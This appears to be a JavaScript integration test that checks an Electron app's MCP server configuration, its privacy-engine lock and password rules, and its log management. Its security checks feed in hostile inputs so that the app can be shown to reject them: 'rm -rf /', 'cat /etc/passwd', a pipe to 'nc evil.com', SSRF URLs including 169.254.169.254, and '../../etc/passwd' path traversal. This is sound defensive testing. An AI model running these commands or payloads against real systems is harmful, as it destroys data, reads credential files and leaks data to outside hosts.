// =============================================================
// R134: MCP / Privacy / Log 系统集成测试
// 角度 1: MCP 服务器配置 CRUD + 连接管理 + 安全校验
// 角度 2: Privacy 引擎锁状态 + 密码校验 + 操作守卫
// 角度 3: Log 文件管理 + 过滤/搜索 + 转发 + 导出安全
// =============================================================

import http from 'node:http'
import os from 'node:os'
import path from 'node:path'

const CDP_PORT = 9222
const BASE = `http://127.0.0.1:${CDP_PORT}`
const STAMP = `r134-${Date.now()}`

async function getTargets() {
  return new Promise((resolve, reject) => {
    http.get(`${BASE}/json`, (res) => {
      let data = ''
      res.on('data', (c) => (data += c))
      res.on('end', () => resolve(JSON.parse(data)))
      res.on('error', reject)
    }).on('error', reject)
  })
}

async function cdpCall(ws, method, params = {}) {
  const id = Math.floor(Math.random() * 1e9)
  return new Promise((resolve, reject) => {
    const handler = (ev) => {
      const msg = JSON.parse(ev.toString())
      if (msg.id === id) {
        ws.off('message', handler)
        if (msg.error) reject(new Error(JSON.stringify(msg.error)))
        else resolve(msg.result)
      }
    }
    ws.on('message', handler)
    ws.send(JSON.stringify({ id, method, params }))
    setTimeout(() => {
      ws.off('message', handler)
      reject(new Error(`CDP timeout: ${method}`))
    }, 30000)
  })
}

async function evalInPage(ws, expr) {
  const r = await cdpCall(ws, 'Runtime.evaluate', {
    expression: expr,
    awaitPromise: true,
    returnByValue: true,
    timeout: 25000,
  })
  if (r.exceptionDetails) return { __error: JSON.stringify(r.exceptionDetails).slice(0, 500) }
  return r.result.value
}

async function sleep(ms) { return new Promise((r) => setTimeout(r, ms)) }

async function connectWS() {
  let WebSocket
  try { WebSocket = (await import('ws')).default } catch { WebSocket = globalThis.WebSocket }
  const targets = await getTargets()
  const pageTarget = targets.find((t) => t.type === 'page' && t.url.includes('index')) || targets.find((t) => t.type === 'page')
  if (!pageTarget) { console.error('No page target found.'); process.exit(1) }
  const ws = new WebSocket(pageTarget.webSocketDebuggerUrl)
  await new Promise((r, rej) => { ws.on('open', r); ws.on('error', rej); setTimeout(() => rej(new Error('ws connect timeout')), 10000) })
  return ws
}

const results = { pass: 0, fail: 0, errors: [] }
function check(name, cond, detail = '') {
  if (cond) { results.pass++; console.log(`  ✅ ${name}`) }
  else { results.fail++; results.errors.push(name); console.log(`  ❌ ${name} ${detail}`) }
}

console.log('\n=== R134: MCP / Privacy / Log 系统集成测试 ===')
console.log(`[R134] STAMP = ${STAMP}`)

let ws = await connectWS()

// =============================================================
console.log('\n[R134-1] MCP 系统基础 - list & feature flag')

// 1.1 MCP list (初始状态,应返回空数组或配置的服务器列表)
const mcpListResult = await evalInPage(ws, `(async () => {
  try {
    const r = await window.api.mcp.list();
    return { success: true, servers: r?.servers || r || [], raw: r };
  } catch (e) { return { threw: e.message }; }
})()`)

check('mcp:list 可调用 (非崩溃)',
  mcpListResult?.success !== false || mcpListResult?.threw === undefined,
  `result=${JSON.stringify(mcpListResult).slice(0, 150)}`)

console.log(`  MCP servers: ${JSON.stringify(mcpListResult?.servers || []).slice(0, 200)}`)

// 1.2 检查 MCP feature flag
const mcpSettings = await evalInPage(ws, `(async () => {
  const s = await window.api.settings.get();
  return { enabled: s?.mcp?.enabled, mcpConfig: s?.mcp };
})()`)

console.log(`  MCP settings: enabled=${mcpSettings?.enabled}, config=${JSON.stringify(mcpSettings?.mcpConfig || {}).slice(0, 150)}`)
check('settings.mcp 字段存在',
  mcpSettings?.mcpConfig !== undefined,
  `mcpConfig=${JSON.stringify(mcpSettings?.mcpConfig)}`)

// =============================================================
console.log('\n[R134-2] MCP 服务器配置 CRUD')

// 2.1 添加有效服务器配置 (stdio transport, 不实际连接)
const testServerId = `${STAMP}-test-server`
const addResult = await evalInPage(ws, `(async () => {
  try {
    const r = await window.api.mcp.add({
      id: ${JSON.stringify(testServerId)},
      name: 'R134 Test Server',
      description: 'Test server for R134',
      enabled: false,
      transport: 'stdio',
      command: 'echo',
      args: ['hello'],
    });
    return { success: r?.success !== false, raw: r };
  } catch (e) { return { threw: e.message }; }
})()`)

check('mcp:add 有效配置添加成功',
  addResult?.success === true,
  `result=${JSON.stringify(addResult).slice(0, 150)}`)

// 2.2 验证添加后的列表
const listAfterAdd = await evalInPage(ws, `(async () => {
  try {
    const r = await window.api.mcp.list();
    const servers = r?.servers || r || [];
    return { count: servers.length, found: servers.find(s => s.id === ${JSON.stringify(testServerId)}) };
  } catch (e) { return { threw: e.message }; }
})()`)

check('添加的服务器在 list 中可见',
  listAfterAdd?.found != null,
  `found=${JSON.stringify(listAfterAdd?.found).slice(0, 100)}`)

// 2.3 更新服务器配置
const updateResult = await evalInPage(ws, `(async () => {
  try {
    const r = await window.api.mcp.update(${JSON.stringify(testServerId)}, { name: 'R134 Updated Server' });
    return { success: r?.success !== false, raw: r };
  } catch (e) { return { threw: e.message }; }
})()`)

check('mcp:update 更新成功',
  updateResult?.success === true,
  `result=${JSON.stringify(updateResult).slice(0, 100)}`)

// 2.4 验证更新后的名称
const listAfterUpdate = await evalInPage(ws, `(async () => {
  const r = await window.api.mcp.list();
  const servers = r?.servers || r || [];
  return { name: servers.find(s => s.id === ${JSON.stringify(testServerId)})?.name };
})()`)

check('更新后名称已变更',
  listAfterUpdate?.name === 'R134 Updated Server',
  `name=${listAfterUpdate?.name}`)

// 2.5 删除服务器
const removeResult = await evalInPage(ws, `(async () => {
  try {
    const r = await window.api.mcp.remove(${JSON.stringify(testServerId)});
    return { success: r?.success !== false, raw: r };
  } catch (e) { return { threw: e.message }; }
})()`)

check('mcp:remove 删除成功',
  removeResult?.success === true,
  `result=${JSON.stringify(removeResult).slice(0, 100)}`)

// 2.6 验证删除后不可查
const listAfterRemove = await evalInPage(ws, `(async () => {
  const r = await window.api.mcp.list();
  const servers = r?.servers || r || [];
  return { found: servers.find(s => s.id === ${JSON.stringify(testServerId)}) != null };
})()`)

check('删除后服务器不可查',
  listAfterRemove?.found === false,
  `found=${listAfterRemove?.found}`)

// =============================================================
console.log('\n[R134-3] MCP 安全校验')

// 3.1 无效 serverId (特殊字符)
const invalidIds = ['', 'a'.repeat(200), 'server with spaces', 'server/with/slashes', 'server;rm -rf']
let invalidIdRejected = 0
for (const invalidId of invalidIds) {
  const r = await evalInPage(ws, `(async () => {
    try {
      const r = await window.api.mcp.add({
        id: ${JSON.stringify(invalidId)},
        name: 'Invalid',
        enabled: false,
        transport: 'stdio',
        command: 'echo',
      });
      return { success: r?.success !== false };
    } catch (e) { return { threw: true }; }
  })()`)
  if (r?.threw || r?.success === false) invalidIdRejected++
  // 清理: 如果意外添加成功,删除
  if (r?.success === true) {
    await evalInPage(ws, `window.api.mcp.remove(${JSON.stringify(invalidId)}).catch(()=>{})`)
  }
}

check('无效 serverId 被拒绝 (空/超长/空格/斜杠/分号)',
  invalidIdRejected >= 4,
  `rejected=${invalidIdRejected}/${invalidIds.length}`)

// 3.2 SSRF URL 校验
const ssrfUrls = [
  'http://127.0.0.1:8080',
  'http://10.0.0.1:8080',
  'http://192.168.1.1:8080',
  'http://172.16.0.1:8080',
  'http://169.254.169.254:8080',
]
let ssrfRejected = 0
for (const url of ssrfUrls) {
  const r = await evalInPage(ws, `(async () => {
    try {
      const r = await window.api.mcp.add({
        id: 'ssrf-test-' + Math.random().toString(36).slice(2,8),
        name: 'SSRF Test',
        enabled: false,
        transport: 'sse',
        url: ${JSON.stringify(url)},
      });
      return { success: r?.success !== false };
    } catch (e) { return { threw: true }; }
  })()`)
  if (r?.threw || r?.success === false) ssrfRejected++
  // 清理
  if (r?.success === true) {
    // 无法获取 id,但 add 可能没成功所以不需要清理
  }
}

check('SSRF URL 被拒绝 (127.x/10.x/192.168.x/172.16.x/169.254.x)',
  ssrfRejected >= 3,
  `rejected=${ssrfRejected}/${ssrfUrls.length}`)

// 3.3 危险命令校验
const dangerousCommands = ['rm -rf /', 'echo; cat /etc/passwd', 'echo | nc evil.com', 'echo $HOME']
let dangerousRejected = 0
for (const cmd of dangerousCommands) {
  const r = await evalInPage(ws, `(async () => {
    try {
      const r = await window.api.mcp.add({
        id: 'cmd-test-' + Math.random().toString(36).slice(2,8),
        name: 'Cmd Test',
        enabled: false,
        transport: 'stdio',
        command: ${JSON.stringify(cmd)},
      });
      return { success: r?.success !== false };
    } catch (e) { return { threw: true }; }
  })()`)
  if (r?.threw || r?.success === false) dangerousRejected++
}

check('危险命令被拒绝 (rm/cat/nc/$变量)',
  dangerousRejected >= 2,
  `rejected=${dangerousRejected}/${dangerousCommands.length}`)

// 3.4 update null patch 被拒绝 (R5-2/Case 9)
const nullPatchResult = await evalInPage(ws, `(async () => {
  try {
    const r = await window.api.mcp.update('any-server', null);
    return { success: r?.success !== false };
  } catch (e) { return { threw: true }; }
})()`)

check('update null patch 被拒绝',
  nullPatchResult?.threw === true || nullPatchResult?.success === false,
  `result=${JSON.stringify(nullPatchResult).slice(0, 100)}`)

// 3.5 连接/测试不存在的服务器
const connectNonExist = await evalInPage(ws, `(async () => {
  try {
    const r = await window.api.mcp.connect('non-existent-server-xyz');
    return { success: r?.success !== false, error: r?.error };
  } catch (e) { return { threw: e.message }; }
})()`)

check('connect 不存在的服务器返回失败 (非崩溃)',
  connectNonExist?.threw || connectNonExist?.success === false,
  `result=${JSON.stringify(connectNonExist).slice(0, 100)}`)

const testNonExist = await evalInPage(ws, `(async () => {
  try {
    const r = await window.api.mcp.test('non-existent-server-xyz');
    return { success: r?.success !== false, error: r?.error };
  } catch (e) { return { threw: e.message }; }
})()`)

check('test 不存在的服务器返回失败 (非崩溃)',
  testNonExist?.threw || testNonExist?.success === false,
  `result=${JSON.stringify(testNonExist).slice(0, 100)}`)

// 3.6 listTools 不存在的服务器
const listToolsNonExist = await evalInPage(ws, `(async () => {
  try {
    const r = await window.api.mcp.listTools('non-existent-server-xyz');
    return { tools: r?.tools || r || [], error: r?.error };
  } catch (e) { return { threw: e.message }; }
})()`)

check('listTools 不存在的服务器返回空数组 (非崩溃)',
  Array.isArray(listToolsNonExist?.tools) || listToolsNonExist?.threw,
  `result=${JSON.stringify(listToolsNonExist).slice(0, 100)}`)

// =============================================================
console.log('\n[R134-4] Privacy 引擎 - 状态 & 锁机制')

// 4.1 获取初始状态
const initialStatus = await evalInPage(ws, `(async () => {
  try {
    const r = await window.api.privacy.status();
    return r;
  } catch (e) { return { threw: e.message }; }
})()`)

console.log(`  初始 privacy status: ${JSON.stringify(initialStatus).slice(0, 200)}`)
check('privacy:status 可调用',
  initialStatus?.threw === undefined,
  `result=${JSON.stringify(initialStatus).slice(0, 150)}`)
check('privacy:status 返回 unlocked 字段',
  typeof initialStatus?.unlocked === 'boolean',
  `unlocked=${initialStatus?.unlocked}`)

// 4.2 锁定
const lockResult = await evalInPage(ws, `(async () => {
  try {
    const r = await window.api.privacy.lock();
    return r;
  } catch (e) { return { threw: e.message }; }
})()`)

check('privacy:lock 可调用',
  lockResult?.threw === undefined && lockResult?.success !== false,
  `result=${JSON.stringify(lockResult).slice(0, 100)}`)

// 4.3 验证锁定后状态
const statusAfterLock = await evalInPage(ws, `(async () => {
  const r = await window.api.privacy.status();
  return r;
})()`)

check('lock 后 status.unlocked = false',
  statusAfterLock?.unlocked === false,
  `unlocked=${statusAfterLock?.unlocked}`)

// 4.4 锁定状态下操作被拒绝
const lockedAnonymize = await evalInPage(ws, `(async () => {
  try {
    const r = await window.api.privacy.anonymize('张三 今天迟到了');
    return r;
  } catch (e) { return { threw: e.message }; }
})()`)

check('锁定状态下 anonymize 被拒绝',
  lockedAnonymize?.success === false || lockedAnonymize?.threw,
  `result=${JSON.stringify(lockedAnonymize).slice(0, 150)}`)

const lockedList = await evalInPage(ws, `(async () => {
  try {
    const r = await window.api.privacy.list();
    return r;
  } catch (e) { return { threw: e.message }; }
})()`)

check('锁定状态下 list 被拒绝',
  lockedList?.success === false || lockedList?.threw,
  `result=${JSON.stringify(lockedList).slice(0, 150)}`)

const lockedFilter = await evalInPage(ws, `(async () => {
  try {
    const r = await window.api.privacy.filter('student', '张三的成绩');
    return r;
  } catch (e) { return { threw: e.message }; }
})()`)

check('锁定状态下 filter 被拒绝',
  lockedFilter?.success === false || lockedFilter?.threw,
  `result=${JSON.stringify(lockedFilter).slice(0, 150)}`)

const lockedDryrun = await evalInPage(ws, `(async () => {
  try {
    const r = await window.api.privacy.dryrun('张三的成绩');
    return r;
  } catch (e) { return { threw: e.message }; }
})()`)

check('锁定状态下 dryrun 被拒绝',
  lockedDryrun?.success === false || lockedDryrun?.threw,
  `result=${JSON.stringify(lockedDryrun).slice(0, 150)}`)

// =============================================================
console.log('\n[R134-5] Privacy 密码校验')

// 5.1 unlock 短密码被拒绝
const shortPwd = await evalInPage(ws, `(async () => {
  try {
    const r = await window.api.privacy.unlock('abc');
    return r;
  } catch (e) { return { threw: e.message }; }
})()`)

check('unlock 短密码 (< 4 chars) 被拒绝',
  shortPwd?.threw || shortPwd?.success === false,
  `result=${JSON.stringify(shortPwd).slice(0, 100)}`)

// 5.2 unlock 超长密码被拒绝
const longPwd = await evalInPage(ws, `(async () => {
  try {
    const r = await window.api.privacy.unlock(${JSON.stringify('x'.repeat(200))});
    return r;
  } catch (e) { return { threw: e.message }; }
})()`)

check('unlock 超长密码 (> 128 chars) 被拒绝',
  longPwd?.threw || longPwd?.success === false,
  `result=${JSON.stringify(longPwd).slice(0, 100)}`)

// 5.3 unlock 非字符串被拒绝
const nonStringPwd = await evalInPage(ws, `(async () => {
  try {
    const r = await window.api.privacy.unlock(12345678);
    return r;
  } catch (e) { return { threw: e.message }; }
})()`)

check('unlock 非字符串密码被拒绝',
  nonStringPwd?.threw || nonStringPwd?.success === false,
  `result=${JSON.stringify(nonStringPwd).slice(0, 100)}`)

// 5.4 unlock 有效格式密码 (4-128 chars) - 只校验格式,不验证正确性
const validFormatPwd = await evalInPage(ws, `(async () => {
  try {
    const r = await window.api.privacy.unlock('test-password-1234');
    return r;
  } catch (e) { return { threw: e.message }; }
})()`)

check('unlock 有效格式密码 (8 chars) 被接受',
  validFormatPwd?.success !== false,
  `result=${JSON.stringify(validFormatPwd).slice(0, 100)}`)

// 5.5 验证 unlock 后状态
const statusAfterUnlock = await evalInPage(ws, `(async () => {
  const r = await window.api.privacy.status();
  return r;
})()`)

check('unlock 后 status.unlocked = true',
  statusAfterUnlock?.unlocked === true,
  `unlocked=${statusAfterUnlock?.unlocked}`)

// 5.6 重新锁定 (恢复初始状态)
await evalInPage(ws, `window.api.privacy.lock()`)

// =============================================================
console.log('\n[R134-6] Privacy 输入校验')

// 确保解锁状态以测试输入校验
await evalInPage(ws, `window.api.privacy.unlock('test-password-1234')`)

// 6.1 add 无效 entity type
const invalidEntity = await evalInPage(ws, `(async () => {
  try {
    const r = await window.api.privacy.add('invalid_type', '张三');
    return r;
  } catch (e) { return { threw: e.message }; }
})()`)

check('add 无效 entity type 被拒绝',
  invalidEntity?.threw || invalidEntity?.success === false,
  `result=${JSON.stringify(invalidEntity).slice(0, 100)}`)

// 6.2 add 空 text
const emptyText = await evalInPage(ws, `(async () => {
  try {
    const r = await window.api.privacy.add('person', '');
    return r;
  } catch (e) { return { threw: e.message }; }
})()`)

check('add 空 text 被拒绝',
  emptyText?.threw || emptyText?.success === false,
  `result=${JSON.stringify(emptyText).slice(0, 100)}`)

// 6.3 add 控制字符
const controlChar = await evalInPage(ws, `(async () => {
  try {
    const r = await window.api.privacy.add('person', 'text\\x00with\\x01control');
    return r;
  } catch (e) { return { threw: e.message }; }
})()`)

check('add 控制字符被拒绝',
  controlChar?.threw || controlChar?.success === false,
  `result=${JSON.stringify(controlChar).slice(0, 100)}`)

// 6.4 filter 无效 receiver
const invalidReceiver = await evalInPage(ws, `(async () => {
  try {
    const r = await window.api.privacy.filter('invalid_receiver', 'text');
    return r;
  } catch (e) { return { threw: e.message }; }
})()`)

check('filter 无效 receiver type 被拒绝',
  invalidReceiver?.threw || invalidReceiver?.success === false,
  `result=${JSON.stringify(invalidReceiver).slice(0, 100)}`)

// 6.5 backup 路径遍历
const pathTraversal = await evalInPage(ws, `(async () => {
  try {
    const r = await window.api.privacy.backup('../../etc/passwd');
    return r;
  } catch (e) { return { threw: e.message }; }
})()`)

check('backup 路径遍历 (..) 被拒绝',
  pathTraversal?.threw || pathTraversal?.success === false,
  `result=${JSON.stringify(pathTraversal).slice(0, 100)}`)

// 6.6 backup NUL 字节
const nulPath = await evalInPage(ws, `(async () => {
  try {
    const r = await window.api.privacy.backup('test\\x00path');
    return r;
  } catch (e) { return { threw: e.message }; }
})()`)

check('backup NUL 字节路径被拒绝',
  nulPath?.threw || nulPath?.success === false,
  `result=${JSON.stringify(nulPath).slice(0, 100)}`)

// 恢复锁定状态
await evalInPage(ws, `window.api.privacy.lock()`)

// =============================================================
console.log('\n[R134-7] Log 系统 - 文件管理')

// 7.1 list log files
const logList = await evalInPage(ws, `(async () => {
  try {
    const r = await window.api.log.list();
    return { files: Array.isArray(r) ? r : (r?.files || []), raw: r };
  } catch (e) { return { threw: e.message }; }
})()`)

check('log:list 可调用',
  logList?.threw === undefined,
  `result=${JSON.stringify(logList).slice(0, 150)}`)

console.log(`  Log files: ${logList?.files?.length || 0} files`)
if (logList?.files?.length > 0) {
  console.log(`  Sample: ${JSON.stringify(logList.files[0]).slice(0, 150)}`)
}

check('log:list 返回文件数组',
  Array.isArray(logList?.files),
  `files=${JSON.stringify(logList?.files).slice(0, 200)}`)

// 7.2 read log tail (使用第一个可用文件)
const firstLogFile = logList?.files?.[0]
if (firstLogFile?.name) {
  const readResult = await evalInPage(ws, `(async () => {
    try {
      const r = await window.api.log.read(${JSON.stringify(firstLogFile.name)}, 10);
      return { content: r, length: r?.length || 0 };
    } catch (e) { return { threw: e.message }; }
  })()`)

  check('log:read 可调用 (返回字符串)',
    readResult?.threw === undefined && typeof readResult?.content === 'string',
    `result=${JSON.stringify(readResult).slice(0, 150)}`)

  console.log(`  Read ${firstLogFile.name}: ${readResult?.length || 0} chars`)
} else {
  console.log('  (无可用日志文件,跳过 read 测试)')
}

// 7.3 read 不存在的日志文件
const readNonExist = await evalInPage(ws, `(async () => {
  try {
    const r = await window.api.log.read('nonexistent-2099-01-01.log', 10);
    return { content: r, length: r?.length || 0 };
  } catch (e) { return { threw: e.message }; }
})()`)

check('read 不存在的日志文件返回空或错误 (非崩溃)',
  readNonExist?.threw !== undefined || readNonExist?.length === 0 || readNonExist?.content === '',
  `result=${JSON.stringify(readNonExist).slice(0, 150)}`)

// 7.4 read 路径遍历
const readTraversal = await evalInPage(ws, `(async () => {
  try {
    const r = await window.api.log.read('../../etc/passwd', 10);
    return { content: r };
  } catch (e) { return { threw: e.message }; }
})()`)

check('read 路径遍历被拒绝',
  readTraversal?.threw !== undefined || readTraversal?.content === '' || readTraversal?.content === undefined,
  `result=${JSON.stringify(readTraversal).slice(0, 100)}`)

// =============================================================
console.log('\n[R134-8] Log 过滤 & 搜索')

if (firstLogFile?.name) {
  // 8.1 filter by level
  const filterResult = await evalInPage(ws, `(async () => {
    try {
      const r = await window.api.log.filter(${JSON.stringify(firstLogFile.name)}, ['error', 'warn'], 50);
      return { content: r, length: r?.length || 0 };
    } catch (e) { return { threw: e.message }; }
  })()`)

  check('log:filter 可调用 (返回字符串)',
    filterResult?.threw === undefined && typeof filterResult?.content === 'string',
    `result=${JSON.stringify(filterResult).slice(0, 150)}`)

  // 8.2 search
  const searchResult = await evalInPage(ws, `(async () => {
    try {
      const r = await window.api.log.search(${JSON.stringify(firstLogFile.name)}, 'error', 50);
      return { content: r, length: r?.length || 0 };
    } catch (e) { return { threw: e.message }; }
  })()`)

  check('log:search 可调用 (返回字符串)',
    searchResult?.threw === undefined && typeof searchResult?.content === 'string',
    `result=${JSON.stringify(searchResult).slice(0, 150)}`)

  console.log(`  Search 'error' in ${firstLogFile.name}: ${searchResult?.length || 0} chars`)
} else {
  console.log('  (无可用日志文件,跳过 filter/search 测试)')
}

// 8.3 filter 无效日志文件名
const filterInvalid = await evalInPage(ws, `(async () => {
  try {
    const r = await window.api.log.filter('nonexistent.log', ['info'], 10);
    return { content: r };
  } catch (e) { return { threw: e.message }; }
})()`)

check('filter 不存在文件返回空 (非崩溃)',
  filterInvalid?.threw !== undefined || filterInvalid?.content === '',
  `result=${JSON.stringify(filterInvalid).slice(0, 100)}`)

// =============================================================
console.log('\n[R134-9] Log 转发 (renderer → main)')

// 9.1 forward 有效 level
const forwardValid = await evalInPage(ws, `(async () => {
  try {
    // forward 是 send (one-way), 不返回值
    window.api.log.forward('info', ${JSON.stringify(`[R134] test log forward ${STAMP}`)});
    await new Promise(r => setTimeout(r, 500));
    return { sent: true };
  } catch (e) { return { threw: e.message }; }
})()`)

check('log:forward (info) 可调用',
  forwardValid?.sent === true,
  `result=${JSON.stringify(forwardValid).slice(0, 100)}`)

// 9.2 forward 无效 level (应默认为 info)
const forwardInvalid = await evalInPage(ws, `(async () => {
  try {
    window.api.log.forward('INVALID_LEVEL', ${JSON.stringify(`[R134] invalid level test ${STAMP}`)});
    await new Promise(r => setTimeout(r, 500));
    return { sent: true };
  } catch (e) { return { threw: e.message }; }
})()`)

check('log:forward 无效 level 不崩溃 (默认 info)',
  forwardInvalid?.sent === true,
  `result=${JSON.stringify(forwardInvalid).slice(0, 100)}`)

// 9.3 验证 forward 的消息出现在日志中
// 等待日志写入,然后搜索
await sleep(1000)
const verifyForward = await evalInPage(ws, `(async () => {
  try {
    const files = await window.api.log.list();
    // 找今天的 renderer 日志
    const today = new Date().toISOString().slice(0, 10);
    const rendererLog = files.find(f => f.name && f.name.includes('renderer') && f.name.includes(today));
    if (!rendererLog) return { found: false, reason: 'no renderer log for today' };
    const content = await window.api.log.search(rendererLog.name, ${JSON.stringify(STAMP)}, 50);
    return { found: content && content.length > 0, contentLength: content?.length || 0 };
  } catch (e) { return { threw: e.message }; }
})()`)

check('forward 的消息出现在 renderer 日志中',
  verifyForward?.found === true,
  `result=${JSON.stringify(verifyForward).slice(0, 150)}`)

// =============================================================
console.log('\n[R134-10] Log 导出安全校验')

if (firstLogFile?.name) {
  // 10.1 export 到有效路径 (临时目录)
  // R134 修复: 在 Node 侧计算临时路径, 渲染进程无 Node 集成, require('os')/'path' 不可用
  const tmpExportPath = path.join(os.tmpdir(), `r134-export-${STAMP}.log`)
  const exportValid = await evalInPage(ws, `(async () => {
    try {
      const r = await window.api.log.export(${JSON.stringify(firstLogFile.name)}, ${JSON.stringify(tmpExportPath)});
      return { bytes: r };
    } catch (e) { return { threw: e.message }; }
  })()`)

  check('log:export 到临时目录成功',
    exportValid?.threw === undefined && exportValid?.bytes > 0,
    `result=${JSON.stringify(exportValid).slice(0, 150)}`)

  // 10.2 export 路径遍历
  const exportTraversal = await evalInPage(ws, `(async () => {
    try {
      const r = await window.api.log.export(${JSON.stringify(firstLogFile.name)}, '../../etc/passwd');
      return { bytes: r };
    } catch (e) { return { threw: e.message }; }
  })()`)

  check('export 路径遍历被拒绝 (返回 0 或抛错)',
    exportTraversal?.threw !== undefined || exportTraversal?.bytes === 0,
    `result=${JSON.stringify(exportTraversal).slice(0, 100)}`)

  // 10.3 export 到系统目录 (Windows: C:\Windows)
  const exportSystem = await evalInPage(ws, `(async () => {
    try {
      const r = await window.api.log.export(${JSON.stringify(firstLogFile.name)}, 'C:\\\\Windows\\\\test.log');
      return { bytes: r };
    } catch (e) { return { threw: e.message }; }
  })()`)

  check('export 到系统目录 (C:\\Windows) 被拒绝',
    exportSystem?.threw !== undefined || exportSystem?.bytes === 0,
    `result=${JSON.stringify(exportSystem).slice(0, 100)}`)

  // 10.4 export 到相对路径
  const exportRelative = await evalInPage(ws, `(async () => {
    try {
      const r = await window.api.log.export(${JSON.stringify(firstLogFile.name)}, 'relative/path.log');
      return { bytes: r };
    } catch (e) { return { threw: e.message }; }
  })()`)

  check('export 到相对路径被拒绝 (要求绝对路径)',
    exportRelative?.threw !== undefined || exportRelative?.bytes === 0,
    `result=${JSON.stringify(exportRelative).slice(0, 100)}`)

  // 10.5 exportWithDialog 可调用 (可能弹出对话框,但不应崩溃)
  // 注意: 不实际调用 exportWithDialog 因为会弹出系统对话框
  // R134 修复: evalInPage 已返回 typeof 字符串, 不能再外层包 typeof
  const exportDialogType = await evalInPage(ws, `typeof window.api.log.exportWithDialog`)
  check('log:exportWithDialog API 存在',
    exportDialogType === 'function',
    `type=${exportDialogType}`)
} else {
  console.log('  (无可用日志文件,跳过 export 测试)')
}

// =============================================================
console.log('\n[R134-11] Log 日志文件格式校验')

// 11.1 验证日志文件名格式
const logFilesFormat = await evalInPage(ws, `(async () => {
  try {
    const files = await window.api.log.list();
    return files.map(f => f.name);
  } catch (e) { return { threw: e.message }; }
})()`)

if (Array.isArray(logFilesFormat)) {
  const validPattern = /^\w+-(\d{4}-\d{2}-\d{2})\.log$/
  let allValid = true
  for (const name of logFilesFormat) {
    if (!validPattern.test(name)) {
      allValid = false
      console.log(`  ⚠️ 非标准文件名: ${name}`)
    }
  }
  check('所有日志文件名匹配 {stream}-{YYYY-MM-DD}.log 格式',
    allValid,
    `invalidCount=${logFilesFormat.filter(n => !validPattern.test(n)).length}`)
} else {
  check('日志文件名格式校验 (list 返回数组)',
    false,
    `result=${JSON.stringify(logFilesFormat).slice(0, 100)}`)
}

// 11.2 验证日志文件包含日期信息
const logFilesWithDate = await evalInPage(ws, `(async () => {
  try {
    const files = await window.api.log.list();
    return files.map(f => ({ name: f.name, date: f.date, sizeBytes: f.sizeBytes, stream: f.stream }));
  } catch (e) { return { threw: e.message }; }
})()`)

if (Array.isArray(logFilesWithDate)) {
  const allHaveFields = logFilesWithDate.every(f => f.name && f.sizeBytes !== undefined)
  check('日志文件包含 name 和 sizeBytes 字段',
    allHaveFields,
    `sample=${JSON.stringify(logFilesWithDate[0]).slice(0, 150)}`)
} else {
  check('日志文件元数据校验',
    false,
    `result=${JSON.stringify(logFilesWithDate).slice(0, 100)}`)
}

// =============================================================
console.log('\n[R134-cleanup] 恢复初始状态')

// 恢复 privacy 锁定状态
await evalInPage(ws, `window.api.privacy.lock()`)
const finalStatus = await evalInPage(ws, `(async () => {
  const r = await window.api.privacy.status();
  return r;
})()`)
check('privacy 已恢复锁定状态',
  finalStatus?.unlocked === false,
  `unlocked=${finalStatus?.unlocked}`)

// 清理: 删除测试创建的 MCP 服务器 (如果有遗留)
await evalInPage(ws, `(async () => {
  try {
    const r = await window.api.mcp.list();
    const servers = r?.servers || r || [];
    for (const s of servers) {
      if (s.id && s.id.startsWith(${JSON.stringify(STAMP)})) {
        await window.api.mcp.remove(s.id);
      }
    }
    return true;
  } catch (e) { return false; }
})()`)

console.log('\n=== R134 完成 ===')
console.log(`通过: ${results.pass}, 失败: ${results.fail}`)
if (results.fail > 0) {
  console.log('失败项:')
  for (const e of results.errors) console.log(`  - ${e}`)
}

ws.close()
process.exit(results.fail > 0 ? 1 : 0)
